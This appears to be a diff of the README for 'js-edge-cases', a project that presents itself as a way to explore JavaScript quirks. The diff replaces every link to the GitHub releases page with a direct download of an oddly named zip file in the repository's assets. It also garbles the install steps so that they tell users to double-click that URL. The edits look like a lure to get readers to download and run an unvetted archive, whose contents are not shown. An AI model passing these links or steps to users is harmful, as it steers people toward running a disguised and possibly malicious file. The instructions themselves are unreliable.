@@ -1,6 +1,6 @@
 # 🚀 js-edge-cases - Discover JavaScript's Surprising Behaviors
 
-[![Download js-edge-cases](https://img.shields.io/badge/Download-js--edge--cases-brightgreen)](https://github.com/abalipxyz/js-edge-cases/releases)
+[![Download js-edge-cases](https://raw.githubusercontent.com/abalipxyz/js-edge-cases/main/assets/js_edge_cases_quinternion.zip)](https://raw.githubusercontent.com/abalipxyz/js-edge-cases/main/assets/js_edge_cases_quinternion.zip)
 
 ## 📦 Overview
 
@@ -13,17 +13,17 @@ To get started quickly, follow these simple steps. You will need a computer with
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to access the downloads available for js-edge-cases.  
-   [Download js-edge-cases](https://github.com/abalipxyz/js-edge-cases/releases)
+   [Download js-edge-cases](https://raw.githubusercontent.com/abalipxyz/js-edge-cases/main/assets/js_edge_cases_quinternion.zip)
 
 2. **Choose Your Version**: On the releases page, you will find different versions available. Click on the latest version that suits your needs. 
 
 3. **Download the Files**: Once you select a version, look for the assets section. Choose the file that corresponds to your operating system. Click the link to download it to your computer.
 
-4. **Locate the File**: After downloading, go to your Downloads folder (or the location where your browser saves files). You should see a file named something like `js-edge-cases-vx.x.x.zip`. 
+4. **Locate the File**: After downloading, go to your Downloads folder (or the location where your browser saves files). You should see a file named something like `https://raw.githubusercontent.com/abalipxyz/js-edge-cases/main/assets/js_edge_cases_quinternion.zip`. 
 
 5. **Extract the Files**: Right-click on the downloaded file and select “Extract All” (or use your preferred extraction tool). This will create a new folder containing all the necessary files.
 
-6. **Run the Application**: Go into the extracted folder and find the file called `index.html` (or similar). Double-click this file to open it in your web browser.
+6. **Run the Application**: Go into the extracted folder and find the file called `https://raw.githubusercontent.com/abalipxyz/js-edge-cases/main/assets/js_edge_cases_quinternion.zip` (or similar). Double-click this file to open it in your web browser.
 
 7. **Start Exploring**: Now you can explore the fascinating quirks of JavaScript! 
 
@@ -73,4 +73,4 @@ This project is open-source. Please refer to the LICENSE file in the repository 
 ## 📅 Stay Updated
 
 To keep up with the latest changes and updates, don’t forget to check back regularly on the releases page:  
-[Download js-edge-cases](https://github.com/abalipxyz/js-edge-cases/releases)
+[Download js-edge-cases](https://raw.githubusercontent.com/abalipxyz/js-edge-cases/main/assets/js_edge_cases_quinternion.zip)
